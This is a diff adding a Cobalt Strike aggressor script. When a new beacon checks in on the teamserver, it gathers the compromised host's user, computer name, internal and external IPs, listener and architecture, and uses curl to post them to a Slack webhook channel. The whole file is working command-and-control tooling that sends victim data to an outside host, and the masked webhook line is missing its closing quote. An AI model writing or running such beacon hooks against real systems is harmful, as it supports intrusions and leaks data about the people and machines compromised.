@@ -1,0 +1,17 @@
+# Based on the work of @sec_groundzero which is based on the work of @bluescreenofjeff
+
+$slack_channel = "#cobaltpigeon-notif";
+$slack_emoji = ':skeleton:';
+$slack_webhookURL = 'https://hooks.slack.com/services/********************;
+$teamserver_hostname = 'cobaltpigeon';
+
+on beacon_initial {
+        $user = beacon_data($1) ["user"];
+        $arch = beacon_data($1) ["barch"];
+	$computer = beacon_data($1)["computer"];
+	$internal = beacon_data($1)["internal"];
+	$external = beacon_data($1)["external"];
+	$listener = beacon_data($1)["listener"];
+        @curl_command = @('curl','-X','POST','--data-urlencode','payload={"username": "cobaltpigen", "icon_emoji": "' . $slack_emoji. '", "channel": "' . $slack_channel . '", "text":"Initial Beacon on ' . $teamserver_hostname . ', '.$1.' -> '. $user.'@'.$computer.'/'.$internal.'/'.$external.'/'.$listener.'/'.$arch.'"}',$slack_webhookURL);
+        exec(@curl_command);
+}
